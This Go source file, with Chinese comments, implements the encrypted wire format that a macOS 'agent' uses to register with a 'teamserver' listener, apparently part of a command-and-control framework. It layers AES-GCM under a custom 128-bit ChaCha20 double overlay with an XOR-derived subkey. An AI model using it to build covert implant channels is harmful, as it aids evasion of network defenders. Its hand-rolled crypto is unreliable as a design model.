package utils

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"math/bits"
)

// SKey is the full session material (16-byte AES key + 16-byte transport salt) after registration.
var SKey []byte

func deriveTransportSubkey(sk, salt []byte) []byte {
	out := make([]byte, 16)
	for i := 0; i < 16; i++ {
		out[i] = sk[i] ^ sk[(i+1)%16] ^ salt[i]
	}
	return out
}

// ---- ChaCha20 (128-bit key variant, 96-bit nonce) ----
//
// ★★ macOS Go agent 的线格式对齐（本轮改动）。
//
// 本文件原为 **双 RC4 overlay、线上无 nonce**；而 teamserver 的 GopherTCP
// listener (gopher_listener_tcp/pl_transport.go) 早已统一成
// **ChaCha20 双覆盖 + 12 字节明文 cnonce 前缀**。两侧线格式不兼容的后果：
// listener 把密文头的 12 字节当成明文 nonce、两条流整体错位 ⇒ `gcm.Open` 报
// "cipher: message authentication failed" ⇒ **macOS agent 首包就注册不上**，
// 且与传输层无关（tcp / libp2p 同样失败）。
//
// 现与 gopher 统一到 ChaCha20。本实现与 listener 的
// chacha20Block / listenerChaCha20Xor / listenerDeriveSubkey **逐字节等价**：
// 常量 "expand 16-byte k"（**128 位密钥**，state 里密钥重复两次）、96 位 nonce、
// 32 位计数器、小端装载、20 轮（10 次双轮）。
//
// ★ 不是 RFC 8439 的 256 位密钥版：不能用 x/crypto/chacha20 或
// cipher.NewChaCha20 替代（那些是 "expand 32-byte k"），换掉即失联。
// ★ 三处实现必须同时改：本文件 / macos_agent/pl_main.go 的 Encrypt·Decrypt /
// listener pl_transport —— 同一份密码学协议在多个包里各写一份，只改一处就是
// **静默失联**（无报错、无日志，只有一份伪装错误页）。
func chachaQr(a, b, c, d *uint32) {
	*a += *b
	*d ^= *a
	*d = bits.RotateLeft32(*d, 16)
	*c += *d
	*b ^= *c
	*b = bits.RotateLeft32(*b, 12)
	*a += *b
	*d ^= *a
	*d = bits.RotateLeft32(*d, 8)
	*c += *d
	*b ^= *c
	*b = bits.RotateLeft32(*b, 7)
}

func chacha20Block(key [4]uint32, nonce [3]uint32, counter uint32) [64]byte {
	state := [16]uint32{
		0x61707865, 0x3320646e, 0x79622d32, 0x6b206574, // "expand 16-byte k"
		key[0], key[1], key[2], key[3],
		key[0], key[1], key[2], key[3],
		counter,
		nonce[0], nonce[1], nonce[2],
	}
	working := state
	for r := 0; r < 10; r++ {
		chachaQr(&working[0], &working[4], &working[8], &working[12])
		chachaQr(&working[1], &working[5], &working[9], &working[13])
		chachaQr(&working[2], &working[6], &working[10], &working[14])
		chachaQr(&working[3], &working[7], &working[11], &working[15])
		chachaQr(&working[0], &working[5], &working[10], &working[15])
		chachaQr(&working[1], &working[6], &working[11], &working[12])
		chachaQr(&working[2], &working[7], &working[8], &working[13])
		chachaQr(&working[3], &working[4], &working[9], &working[14])
	}
	var out [64]byte
	for i := 0; i < 16; i++ {
		binary.LittleEndian.PutUint32(out[4*i:], working[i]+state[i])
	}
	return out
}

func chacha20Xor(key16, nonce12, data []byte) []byte {
	if len(key16) != 16 || len(nonce12) != 12 {
		return nil
	}
	var key [4]uint32
	for i := 0; i < 4; i++ {
		key[i] = binary.LittleEndian.Uint32(key16[4*i:])
	}
	var nonce [3]uint32
	for i := 0; i < 3; i++ {
		nonce[i] = binary.LittleEndian.Uint32(nonce12[4*i:])
	}
	out := make([]byte, len(data))
	var counter uint32
	for off := 0; off < len(data); off += 64 {
		block := chacha20Block(key, nonce, counter)
		n := len(data) - off
		if n > 64 {
			n = 64
		}
		for i := 0; i < n; i++ {
			out[off+i] = data[off+i] ^ block[i]
		}
		counter++
	}
	return out
}

// transportOverlay 双层异或流：加密 sk 再 sub，解密 sub 再 sk（顺序相反）。
// nonce 是**每条消息不同**的 12 字节 cnonce —— 同一会话密钥下不重用 ChaCha20 流。
func transportOverlay(buf []byte, sk, salt []byte, nonce []byte, decrypt bool) []byte {
	sub := deriveTransportSubkey(sk, salt)
	if decrypt {
		x := chacha20Xor(sub, nonce, buf)
		return chacha20Xor(sk, nonce, x)
	}
	x := chacha20Xor(sk, nonce, buf)
	return chacha20Xor(sub, nonce, x)
}

// splitSessionKeyMaterial: 32 字节及以上取 key[:16] 作 AES 密钥、key[16:32] 作
// 传输 salt；**16 字节时 salt 补零** —— profile blob 用的就是监听器的 16 字节
// encrypt_key 走这条路（与服务端 listenerSplitKey 一致）。
func splitSessionKeyMaterial(key []byte) (aesKey, salt []byte, err error) {
	if len(key) >= 32 {
		return append([]byte(nil), key[:16]...), append([]byte(nil), key[16:32]...), nil
	}
	if len(key) == 16 {
		return key, make([]byte, 16), nil
	}
	return nil, nil, fmt.Errorf("key too short: %d", len(key))
}

// EncryptData: AES-GCM (16-byte key) 后接 ChaCha20 双覆盖，线上格式 =
// cnonce(12) || overlay(gcm.Seal(nonce, nonce, data))，与 teamserver GopherTCP
// listener 的 DecryptData（pl_transport.go）逐字节互通。
//
// 同一个函数服务两个密钥：**init 用监听器密钥（16 字节）**，注册后会话用
// session key（32 字节 = EncryptKey || TransportSalt）。
func EncryptData(data []byte, key []byte) ([]byte, error) {
	aesKey, salt, err := splitSessionKeyMaterial(key)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	inner := gcm.Seal(nonce, nonce, data, nil)

	cnonce := make([]byte, 12)
	if _, err = io.ReadFull(rand.Reader, cnonce); err != nil {
		return nil, err
	}
	out := transportOverlay(inner, aesKey, salt, cnonce, false)

	res := make([]byte, 12+len(out))
	copy(res, cnonce)
	copy(res[12:], out)
	return res, nil
}

// DecryptData inverts EncryptData.
func DecryptData(data []byte, key []byte) ([]byte, error) {
	aesKey, salt, err := splitSessionKeyMaterial(key)
	if err != nil {
		return nil, err
	}
	if len(data) < 12 {
		return nil, errors.New("ciphertext too short")
	}
	cnonce := data[:12]
	body := data[12:]

	inner := transportOverlay(body, aesKey, salt, cnonce, true)

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	if len(inner) < ns {
		return nil, errors.New("ciphertext too short")
	}
	nonce, ct := inner[:ns], inner[ns:]
	return gcm.Open(nil, nonce, ct, nil)
}
